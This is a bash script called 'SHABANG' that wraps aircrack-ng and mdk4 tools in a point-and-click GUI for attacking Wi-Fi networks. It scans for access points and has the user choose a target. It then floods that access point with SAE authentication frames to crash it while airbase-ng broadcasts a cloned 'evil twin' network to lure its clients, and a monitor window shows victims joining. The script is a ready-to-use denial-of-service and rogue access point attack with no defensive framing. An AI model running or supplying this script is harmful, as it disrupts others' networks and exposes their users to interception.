#!/bin/bash

# --- 1. Tool Check & Setup ---
# Ensures your environment has the necessary 'Shabang' tools
if ! command -v zenity &> /dev/null; then
    sudo apt update && sudo apt install zenity xterm mdk4 aircrack-ng -y
fi

# --- 2. Interface Selection ---
# Logical Step: Identify which RTL88x2bu you want to use
IFACE=$(zenity --list --title="SHABANG: Select Interface" --column="Interface" $(ls /sys/class/net | grep wlan))
[ -z "$IFACE" ] && exit 1

# --- 3. Phase 1: Live Monitoring & Target Selection ---
# Clear old data to prevent logic errors
rm -f /tmp/shabang_scan*

# Launch airodump in a background window so you can see the signal strengths
xterm -geometry 100x20 -T "LIVE SCANNER - LOOK HERE" -e "sudo airodump-ng $IFACE --band g -w /tmp/shabang_scan --output-format csv" &
SCAN_PID=$!

# Logic Gate: Wait for the file to exist before the GUI tries to read it
while [ ! -f /tmp/shabang_scan-01.csv ]; do sleep 1; done

# GUI Selector: Refreshes the list from the live scan file
zenity --info --text="SCANNING ACTIVE.\n\n1. Look at the xterm window for targets.\n2. When you see your target, click OK here to select it." --width=400

# Stop the scanner to free up the card for Phase 2
kill $SCAN_PID

# Parse the CSV into a clickable GUI list
TARGET_RAW=$(awk -F, 'NR>2 {print $1 "|" $14}' /tmp/shabang_scan-01.csv | zenity --list --title="SELECT YOUR TARGET" --column="BSSID" --column="SSID" --delimiter="|")

# Extract the variables needed for the attack logic
BSSID=$(echo $TARGET_RAW | cut -d'|' -f1 | tr -d ' ')
SSID=$(echo $TARGET_RAW | cut -d'|' -f2 | tr -d ' ')
CH=$(grep "$BSSID" /tmp/shabang_scan-01.csv | awk -F, '{print $4}' | tr -d ' ')

if [ -z "$BSSID" ]; then echo "No target selected. Exiting."; exit 1; fi

# --- 4. Phase 2: The Attack (Crash & Trap) ---
# Lock card to the specific channel to avoid 'Device Busy' errors
sudo iw dev $IFACE set channel $CH

# Window 1: The CPU Crusher (SAE Flood) - Destroys the real AP's logic
xterm -T "SHABANG: CRASHING $BSSID" -e "sudo mdk4 $IFACE a -a $BSSID -m -s 1000" &

# Window 2: The Trap (Evil Twin) - Lures the victims to you
# Removed -z flag to ensure driver stability on single-card setups
xterm -T "SHABANG: CLONING $SSID" -e "sudo airbase-ng -e '$SSID' -c $CH $IFACE" &

# Window 3: The Fallout Monitor - Watch clients join your trap
xterm -T "SHABANG: FALLOUT MONITOR" -e "sudo airodump-ng --bssid $BSSID --channel $CH $IFACE" &

zenity --info --text="ATTACK ACTIVE.\n\nTarget: $SSID\nChannel: $CH\n\nClose the xterm windows to stop."
